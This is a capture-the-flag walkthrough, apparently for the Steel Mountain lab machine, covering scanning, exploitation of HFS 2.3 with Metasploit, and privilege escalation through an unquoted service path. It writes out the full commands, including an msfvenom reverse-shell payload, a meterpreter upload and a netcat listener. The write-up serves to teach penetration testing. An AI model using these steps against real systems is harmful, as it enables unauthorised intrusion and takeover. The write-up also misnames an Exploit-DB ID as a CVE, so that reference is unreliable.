# Enumeration 
Start simple nmap scan to detect opened ports and services that running on it , Also to detect version of operation system.
```bash
sudo nmap -p- -Pn -A -T4 10.130.178.254
```
**Nmap result:**
```
Nmap scan report for 10.130.178.254
Host is up (0.00072s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2026-04-11T13:17:33+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49197/tcp open  msrpc              Microsoft Windows RPC
49199/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=4/11%OT=80%CT=1%CU=35449%PV=Y%DS=1%DC=T%G=Y%TM=69DA4A2
OS:9%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301NW8ST11%O
OS:5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%
OS:W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%
OS:S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 0e:ff:b6:e4:22:b9 (unknown)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-11T13:17:28
|_  start_date: 2026-04-11T13:12:40

TRACEROUTE (using port 587/tcp)
HOP RTT     ADDRESS
1   0.86 ms 10.130.178.254
```
First there is open HTTP server on port 80 let's check it.
![[Pasted image 20260411152338.png|442]]
XD , if we watched [Mr.robot](![[Pasted image 20260411152613.png]]) you will understand this joke . Anyways we found first flag .this guy's name in page source code
## flag1
LOOK AT SOURCE CODE.

port `tcp/8080` have host another HTTP server. let's investigate it.
![1](../../images/ste-1_clean.png)
there is http server works on it with version `2.3` , after searching it in [Exploit-DB](https://www.exploit-db.com) to check if there vulnerability for this server and i found this [CVE-2014-39161](https://www.exploit-db.com/exploits/39161) . So we will use *metasploit framework* to gain initial access via this vulnerable HTTP server.
# Initial Access
using *metasploit* exploit `exploit/windows/http/rejetto_hfs_exec`
![2](../../images/ste-2_clean.png)
## flag
![3](../../images/ste-3_clean.png)
Here is the second flag 

# Privilege Escalation
## Enumeration
Using enumeration script [powerup](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)to enumerate for privilege escalation. Upload it via meterpreter shell
```msfconsole
meterpreter > upload  PowerUp.ps1
meterpreter > load  powershell
```
then execute the script
```
meterpreter > load powershell
meterpreter > powershell_shell 
PS > . ./PowerUp.ps1
PS > Invoke-AllChecks
```
**Result:**
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths
```
We found this service which can lead us to privilege escalation because of *Advanced SystemCare* is not quoted which it critical because when windows try to execute this `AdvancedSystemCareService9` it will search for `Advanced` then execute it before search for the whole service path `Advanced SystemCare`.

## Weaponization
creating our payload via *msfvenom*
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.129.112.225 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
then we will upload it via meterpreter inside unquoted path ` C:\Program Files (x86)\IObit\Advanced SystemCare\`
```meterpreter
meterpreter > upload Advanced.exe "C:\\Program Files (x86)\\IObit\\Advanced.exe"
[*] Uploading  : /root/kali-windows-binaries/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/kali-windows-binaries/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced.exe
[*] Completed  : /root/kali-windows-binaries/Advanced.exe -> C:\Program Files (x86)\IObit\Advanced.exe
```

## Exploit
after that open netcat to catch the shell. 
```shell
nc -lnvp 4443
```
then restart vulnerable service
```powershell
sc.exe stop AdvancedSystemCareService9
sc.exe start AdvancedSystemCareService9
```
now you can catch the shell...
![4](../../images/ste-4_clean.png)
## Root flag
![5](../../images/ste-5_clean.png)

